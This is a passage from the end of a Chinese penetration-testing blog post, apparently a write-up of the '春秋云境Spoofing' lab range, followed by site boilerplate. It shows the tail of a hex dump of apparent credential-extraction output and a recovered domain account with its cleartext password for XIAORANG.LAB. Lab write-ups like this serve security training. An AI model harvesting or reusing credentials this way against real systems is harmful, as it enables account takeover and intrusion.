class="hljs-number">68</span> <span class="hljs-number">65</span> f9 <span class="hljs-number">0</span>e bd <span class="hljs-number">95</span> aa <span class="hljs-number">5</span>e <span class="hljs-number">02</span> <span class="hljs-number">11</span> <span class="hljs-number">76</span> bf <span class="hljs-built_in">f0</span><br>                           <span class="hljs-number">1</span>a df <span class="hljs-number">9</span>d b2 <span class="hljs-number">5</span>d <span class="hljs-number">32</span> <span class="hljs-number">6</span>a <span class="hljs-number">4</span>a b7 <span class="hljs-built_in">c7</span> ab <span class="hljs-number">2</span>c <span class="hljs-number">70</span> <span class="hljs-number">18</span> <span class="hljs-number">47</span> <span class="hljs-number">21</span> <span class="hljs-number">4</span>a <span class="hljs-number">00</span> a8 <span class="hljs-number">77</span> <span class="hljs-number">1</span>e <span class="hljs-number">21</span> e4 <span class="hljs-number">00</span> <span class="hljs-number">84</span> <span class="hljs-number">2</span>f <span class="hljs-built_in">d8</span> aa <span class="hljs-number">04</span> <span class="hljs-number">02</span> <span class="hljs-number">7</span>b <span class="hljs-number">42</span> ed fa<br>                           <span class="hljs-number">25</span> de da fd e8 <span class="hljs-number">81</span> de b7 <span class="hljs-number">7</span>e <span class="hljs-number">82</span> <span class="hljs-number">9</span>d f9 <span class="hljs-number">55</span> <span class="hljs-number">6</span>a cb be <span class="hljs-number">73</span> b7 <span class="hljs-number">39</span> af df <span class="hljs-number">0</span>b <span class="hljs-number">48</span> <span class="hljs-number">37</span> aa a5 <span class="hljs-number">9</span>b <span class="hljs-number">5</span>d <span class="hljs-number">93</span> <span class="hljs-number">23</span> <span class="hljs-built_in">c6</span> <span class="hljs-number">20</span> <span class="hljs-number">77</span> <span class="hljs-number">7</span>f<br>                           <span class="hljs-number">26</span> <span class="hljs-built_in">c8</span> <span class="hljs-number">40</span> <span class="hljs-number">84</span> <span class="hljs-built_in">c0</span> <span class="hljs-number">27</span> <span class="hljs-number">5</span>b <span class="hljs-number">1</span>f <span class="hljs-number">20</span> <span class="hljs-number">44</span> <span class="hljs-built_in">d9</span> <span class="hljs-number">73</span> <span class="hljs-number">61</span> e9 cf <span class="hljs-number">0</span>f <span class="hljs-number">16</span> <span class="hljs-number">5</span>b <span class="hljs-number">98</span> <span class="hljs-built_in">c1</span> <span class="hljs-number">9</span>d <span class="hljs-number">5</span>a <span class="hljs-number">26</span> <span class="hljs-number">0</span>b <span class="hljs-number">47</span> <span class="hljs-number">68</span> <span class="hljs-number">34</span> <span class="hljs-number">09</span> dc <span class="hljs-number">68</span> <span class="hljs-number">0</span>f <span class="hljs-number">90</span> <span class="hljs-built_in">d6</span> <span class="hljs-built_in">d1</span><br>                           <span class="hljs-number">05</span> <span class="hljs-built_in">d4</span> <span class="hljs-number">97</span> <span class="hljs-number">62</span> e2 <span class="hljs-number">4</span>d <span class="hljs-number">6</span>a <span class="hljs-number">7</span>c <span class="hljs-number">01</span> e4 <span class="hljs-number">74</span> <span class="hljs-number">48</span> <span class="hljs-number">3</span>a bf <span class="hljs-number">42</span> b8 <span class="hljs-number">50</span> fa <span class="hljs-number">2</span>a b3 <span class="hljs-number">19</span> <span class="hljs-number">65</span> <span class="hljs-built_in">d9</span> e9 a7 <span class="hljs-number">2</span>d <span class="hljs-number">38</span> <span class="hljs-number">52</span> <span class="hljs-number">03</span> <span class="hljs-number">68</span> e8 <span class="hljs-number">45</span> ef <span class="hljs-built_in">f7</span><br>                           <span class="hljs-number">3</span>d <span class="hljs-number">55</span><br><span class="hljs-symbol">yangmei</span>      XIAORANG.LAB  xrihGHgoNZQ<br></code></pre></td></tr></table></figure>
+
+<p>域账户yangme:xrihGHgoNZQ</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="category-chain-item">渗透测试</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="print-no-link">#渗透测试</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>春秋云境Spoofing</div>
+      <div>https://www.xiaotian.org.cn/2026/03/17/春秋云境Spoofing/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>xiaotian</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年3月17日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/03/16/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/" title="春秋云境Hospital">
+                        <span class="hidden-mobile">春秋云境Hospital</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
